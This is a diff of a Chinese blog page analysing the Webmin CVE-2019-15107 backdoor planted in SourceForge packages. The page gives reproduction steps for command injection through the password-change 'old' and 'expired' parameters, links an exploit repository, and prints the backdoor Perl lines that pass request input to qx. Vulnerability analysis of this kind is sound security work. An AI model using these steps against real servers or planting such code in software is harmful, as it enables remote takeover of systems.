@@ -5,18 +5,18 @@
     
     <title>Webmin RCE(CVE-2019-15107)简析 | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Webmin RCE(CVE-2019-15107)简析 写在前面  这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
+    <meta name="description" content="Webmin RCE(CVE-2019-15107)简析写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
 <meta name="keywords" content="漏洞分析">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Webmin RCE(CVE-2019-15107)简析">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20190824-webmin.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="Webmin RCE(CVE-2019-15107)简析 写在前面  这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
+<meta property="og:description" content="Webmin RCE(CVE-2019-15107)简析写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
 <meta property="og:updated_time" content="2021-10-29T11:39:31.883Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Webmin RCE(CVE-2019-15107)简析">
-<meta name="twitter:description" content="Webmin RCE(CVE-2019-15107)简析 写在前面  这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
+<meta name="twitter:description" content="Webmin RCE(CVE-2019-15107)简析写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
 <meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
     
 
@@ -246,69 +246,64 @@
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="webmin-rcecve-2019-15107简析">Webmin RCE(CVE-2019-15107)简析</h1>
-<h2 id="写在前面">写在前面</h2>
-<ul>
+			<h1 id="Webmin-RCE-CVE-2019-15107-简析"><a href="#Webmin-RCE-CVE-2019-15107-简析" class="headerlink" title="Webmin RCE(CVE-2019-15107)简析"></a>Webmin RCE(CVE-2019-15107)简析</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
 <li>这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。</li>
 <li>漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。</li>
 </ul>
 <a id="more"></a>
-<h3 id="简介">简介</h3>
-<ul>
-<li><p>Webmin是一个基于Web的界面，用于Unix的系统管理。使用任何支持表和表单的浏览器，可以设置用户帐户，Apache，DNS，文件共享等。</p></li>
-<li><p>2019年8月10日，pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。</p></li>
-<li><p>该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是SourceForge上某些版本的安装包和源码被植入了后门导致的。</p></li>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
+<li><p>Webmin是一个基于Web的界面，用于Unix的系统管理。使用任何支持表和表单的浏览器，可以设置用户帐户，Apache，DNS，文件共享等。</p>
+</li>
+<li><p>2019年8月10日，pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。</p>
+</li>
+<li><p>该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是SourceForge上某些版本的安装包和源码被植入了后门导致的。</p>
+</li>
 </ul>
-<h2 id="dockerfile构建">Dockerfile构建</h2>
-<ul>
-<li>踩过了一些环境搭建的坑后得到了两大版本的可以复现的dockerfile，直接上地址： https://github.com/HACHp1/webmin_docker_and_exp</li>
+<h2 id="Dockerfile构建"><a href="#Dockerfile构建" class="headerlink" title="Dockerfile构建"></a>Dockerfile构建</h2><ul>
+<li>踩过了一些环境搭建的坑后得到了两大版本的可以复现的dockerfile，直接上地址：<br><a href="https://github.com/HACHp1/webmin_docker_and_exp" target="_blank" rel="external">https://github.com/HACHp1/webmin_docker_and_exp</a></li>
 </ul>
-<h2 id="复现">复现</h2>
-<h3 id="v1.920">v1.920</h3>
-<p>首先在v1.920版本复现： 使用用户名：root，密码：pass登陆；之后进入webmin权限设置界面:</p>
-<p><img src="http://159.75.52.53/img/blogimg/webmin/1.png"></p>
-<p>将提醒用户修改过期密码提示打钩并保存： <img src="http://159.75.52.53/img/blogimg/webmin/2.png"></p>
-<p>待webmin重启后，进入webmin user界面添加新用户（新建用户后登陆新用户才会进入修改密码界面）： <img src="http://159.75.52.53/img/blogimg/webmin/3.png"></p>
-<p>勾选强制修改选项： <img src="http://159.75.52.53/img/blogimg/webmin/4.png"></p>
-<p>注销当前用户，登陆新用户，此时会要求修改密码： <img src="http://159.75.52.53/img/blogimg/webmin/5.png"></p>
-<p>截包，可以在old参数注入命令： <img src="http://159.75.52.53/img/blogimg/webmin/6.png"></p>
-<p>反弹shell： <img src="http://159.75.52.53/img/blogimg/webmin/7.png"></p>
-<h3 id="v1.890">v1.890</h3>
-<p>在@Ethan搜寻漏洞成因的过程中，发现在版本v1.890中有明显的后门代码，可以直接通过expired参数执行命令，在post参数中仅添加expired参数就能够执行命令（我直接写的脚本，就不截图了）。</p>
-<h2 id="exp编写">EXP编写</h2>
-<ul>
-<li>根据复现情况很容易可以写出EXP：https://github.com/HACHp1/webmin_docker_and_exp</li>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="v1-920"><a href="#v1-920" class="headerlink" title="v1.920"></a>v1.920</h3><p>首先在v1.920版本复现：<br>使用用户名：root，密码：pass登陆；之后进入webmin权限设置界面:</p>
+<p><img src="http://159.75.52.53/img/blogimg/webmin/1.png" alt=""></p>
+<p>将提醒用户修改过期密码提示打钩并保存：<br><img src="http://159.75.52.53/img/blogimg/webmin/2.png" alt=""></p>
+<p>待webmin重启后，进入webmin user界面添加新用户（新建用户后登陆新用户才会进入修改密码界面）：<br><img src="http://159.75.52.53/img/blogimg/webmin/3.png" alt=""></p>
+<p>勾选强制修改选项：<br><img src="http://159.75.52.53/img/blogimg/webmin/4.png" alt=""></p>
+<p>注销当前用户，登陆新用户，此时会要求修改密码：<br><img src="http://159.75.52.53/img/blogimg/webmin/5.png" alt=""></p>
+<p>截包，可以在old参数注入命令：<br><img src="http://159.75.52.53/img/blogimg/webmin/6.png" alt=""></p>
+<p>反弹shell：<br><img src="http://159.75.52.53/img/blogimg/webmin/7.png" alt=""></p>
+<h3 id="v1-890"><a href="#v1-890" class="headerlink" title="v1.890"></a>v1.890</h3><p>在@Ethan搜寻漏洞成因的过程中，发现在版本v1.890中有明显的后门代码，可以直接通过expired参数执行命令，在post参数中仅添加expired参数就能够执行命令（我直接写的脚本，就不截图了）。</p>
+<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><ul>
+<li>根据复现情况很容易可以写出EXP：<a href="https://github.com/HACHp1/webmin_docker_and_exp" target="_blank" rel="external">https://github.com/HACHp1/webmin_docker_and_exp</a></li>
 </ul>
-<h2 id="漏洞原理以及修复方案分析">漏洞原理以及修复方案分析</h2>
-<p>既然是后门，调用起来就比较容易，执行过程也比较好分析。</p>
-<h3 id="v1.890-1">v1.890</h3>
-<ul>
+<h2 id="漏洞原理以及修复方案分析"><a href="#漏洞原理以及修复方案分析" class="headerlink" title="漏洞原理以及修复方案分析"></a>漏洞原理以及修复方案分析</h2><p>既然是后门，调用起来就比较容易，执行过程也比较好分析。</p>
+<h3 id="v1-890-1"><a href="#v1-890-1" class="headerlink" title="v1.890"></a>v1.890</h3><ul>
 <li>通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门：</li>
 </ul>
-<p><img src="http://159.75.52.53/img/blogimg/webmin/8.png"></p>
+<p><img src="http://159.75.52.53/img/blogimg/webmin/8.png" alt=""></p>
 <ul>
-<li>在后门版本中，后门执行代码为：<code>$in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;</code>，代码使用qx直接执行了expired参数。而正常版本中，此处只是提示密码修改模式未开启：<code>$miniserv{'passwd_mode'} == 2 || die &quot;Password changing is not enabled!&quot;;</code>。并且在之前没有任何if逻辑，使此处的RCE不需要其他条件便能执行（而在1.9x中，需要一些条件才能执行到系统命令）。</li>
+<li>在后门版本中，后门执行代码为：<code>$in{&#39;expired&#39;} eq &#39;&#39; || die $text{&#39;password_expired&#39;},qx/$in{&#39;expired&#39;}/;</code>，代码使用qx直接执行了expired参数。而正常版本中，此处只是提示密码修改模式未开启：<code>$miniserv{&#39;passwd_mode&#39;} == 2 || die &quot;Password changing is not enabled!&quot;;</code>。并且在之前没有任何if逻辑，使此处的RCE不需要其他条件便能执行（而在1.9x中，需要一些条件才能执行到系统命令）。</li>
 </ul>
-<h3 id="v1.920-1">v1.920</h3>
-<ul>
-<li><p>类似1.890版本，通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门： <img src="http://159.75.52.53/img/blogimg/webmin/9.png"></p></li>
-<li>但是在1.920版本中，由于执行条件的问题，默认配置不能RCE；一般来讲，攻击者都是要使利用面尽可能的广的，但是此处攻击者的做法却使攻击成功的可能性大大降低，可能是由于攻击者自身对webmin的执行过程不熟悉，认为执行条件是默认条件而产生疏忽所致。</li>
-<li><p>代码执行主要流程如下： 首先，在第12行需要<code>passwd_mode</code>为2，也就是之前复现中的“将提醒用户修改过期密码提示打钩并保存”这步会将其设置为2。由于webmin默认并不会设置其为2，这一步就会使绝大多数受害机不会遭受RCE。 <figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$miniserv&#123;<span class="string">'passwd_mode'</span>&#125; == <span class="number">2</span> || <span class="keyword">die</span> <span class="string">"Password changing is not enabled!"</span>;</div></pre></td></tr></table></figure></p></li>
-<li><p>此外，根据以下代码中的<code>if ($wuser-&gt;{'pass'} eq 'x')</code>可知，如果user是unix的权限用户（root），则将其复制为<code>undef</code>，此时将不会进入后门触发处，所以在利用后门时，需要使用非root的用户。</p></li>
+<h3 id="v1-920-1"><a href="#v1-920-1" class="headerlink" title="v1.920"></a>v1.920</h3><ul>
+<li><p>类似1.890版本，通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门：<br><img src="http://159.75.52.53/img/blogimg/webmin/9.png" alt=""></p>
+</li>
+<li><p>但是在1.920版本中，由于执行条件的问题，默认配置不能RCE；一般来讲，攻击者都是要使利用面尽可能的广的，但是此处攻击者的做法却使攻击成功的可能性大大降低，可能是由于攻击者自身对webmin的执行过程不熟悉，认为执行条件是默认条件而产生疏忽所致。</p>
+</li>
+<li><p>代码执行主要流程如下：<br>首先，在第12行需要<code>passwd_mode</code>为2，也就是之前复现中的”将提醒用户修改过期密码提示打钩并保存”这步会将其设置为2。由于webmin默认并不会设置其为2，这一步就会使绝大多数受害机不会遭受RCE。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$miniserv&#123;<span class="string">'passwd_mode'</span>&#125; == <span class="number">2</span> || <span class="keyword">die</span> <span class="string">"Password changing is not enabled!"</span>;</div></pre></td></tr></table></figure>
+</li>
+<li><p>此外，根据以下代码中的<code>if ($wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;)</code>可知，如果user是unix的权限用户（root），则将其复制为<code>undef</code>，此时将不会进入后门触发处，所以在利用后门时，需要使用非root的用户。</p>
+</li>
 </ul>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Is this a Webmin user?</span></div><div class="line"><span class="keyword">if</span> (&amp;foreign_check(<span class="string">"acl"</span>)) &#123;</div><div class="line">	&amp;foreign_require(<span class="string">"acl"</span>, <span class="string">"acl-lib.pl"</span>);</div><div class="line">	($wuser) = <span class="keyword">grep</span> &#123; $_-&gt;&#123;<span class="string">'name'</span>&#125; eq $in&#123;<span class="string">'user'</span>&#125; &#125; &amp;acl::list_users();</div><div class="line">	<span class="keyword">if</span> ($wuser-&gt;&#123;<span class="string">'pass'</span>&#125; eq <span class="string">'x'</span>) &#123;</div><div class="line">		<span class="comment"># A Webmin user, but using Unix authentication</span></div><div class="line">		$wuser = <span class="keyword">undef</span>;</div><div class="line">		&#125;</div><div class="line">	<span class="keyword">elsif</span> ($wuser-&gt;&#123;<span class="string">'pass'</span>&#125; eq <span class="string">'*LK*'</span> ||</div><div class="line">	       $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; =~ <span class="regexp">/^\!/</span>) &#123;</div><div class="line">		&amp;pass_error(<span class="string">"Webmin users with locked accounts cannot change "</span>.</div><div class="line">		       	    <span class="string">"their passwords!"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="keyword">if</span> (!$in&#123;<span class="string">'pam'</span>&#125; &amp;&amp; !$wuser) &#123;</div><div class="line">	$miniserv&#123;<span class="string">'passwd_cindex'</span>&#125; <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $miniserv&#123;<span class="string">'passwd_mindex'</span>&#125; <span class="keyword">ne</span> <span class="string">''</span> || </div><div class="line">		<span class="keyword">die</span> <span class="string">"Missing password file configuration"</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($wuser) &#123;</div><div class="line">	<span class="comment"># Update Webmin user's password</span></div><div class="line">	$enc = &amp;acl::encrypt_password($in&#123;<span class="string">'old'</span>&#125;, $wuser-&gt;&#123;<span class="string">'pass'</span>&#125;);</div><div class="line">	$enc eq $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; || &amp;pass_error($text&#123;<span class="string">'password_eold'</span>&#125;,<span class="keyword">qx</span>/$in&#123;<span class="string">'old'</span>&#125;/);</div><div class="line">	$perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">'user'</span>&#125;, $in&#123;<span class="string">'new1'</span>&#125;);</div><div class="line">	$perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">'password_enewpass'</span>, $perr));</div><div class="line">	$wuser-&gt;&#123;<span class="string">'pass'</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">'new1'</span>&#125;);</div><div class="line">	$wuser-&gt;&#123;<span class="string">'temppass'</span>&#125; = <span class="number">0</span>;</div><div class="line">	&amp;acl::modify_user($wuser-&gt;&#123;<span class="string">'name'</span>&#125;, $wuser);</div><div class="line">	&amp;reload_miniserv();</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
-<h2 id="总结">总结</h2>
-<ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
 <li>此CVE是由黑客以某种方式篡改了webmin的官方SourceForge代码而写入的后门。</li>
 <li>整个后门的逻辑比较简单，分析过程也比较顺利。</li>
 <li>在后门追踪的过程中，可以体会到很多技术以外的东西以及当年最初接触到黑客文化的一种侠义感（:)开始吹比）；第一次接触到代码跟踪，在过程中学到了一些东西。</li>
 </ul>
-<h2 id="参考资料">参考资料</h2>
-<ul>
-<li>https://blog.firosolutions.com/exploits/webmin/</li>
-<li>https://www.4hou.com/technology/19803.html</li>
-<li>https://paper.seebug.org/1019/</li>
-<li>https://github.com/webmin/webmin/issues/947</li>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://blog.firosolutions.com/exploits/webmin/" target="_blank" rel="external">https://blog.firosolutions.com/exploits/webmin/</a></li>
+<li><a href="https://www.4hou.com/technology/19803.html" target="_blank" rel="external">https://www.4hou.com/technology/19803.html</a></li>
+<li><a href="https://paper.seebug.org/1019/" target="_blank" rel="external">https://paper.seebug.org/1019/</a></li>
+<li><a href="https://github.com/webmin/webmin/issues/947" target="_blank" rel="external">https://github.com/webmin/webmin/issues/947</a></li>
 </ul>
 
         
@@ -607,7 +602,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy; 2022 HACHp1<br>
+            &copy; 2023 HACHp1<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
         </div>
     </div>
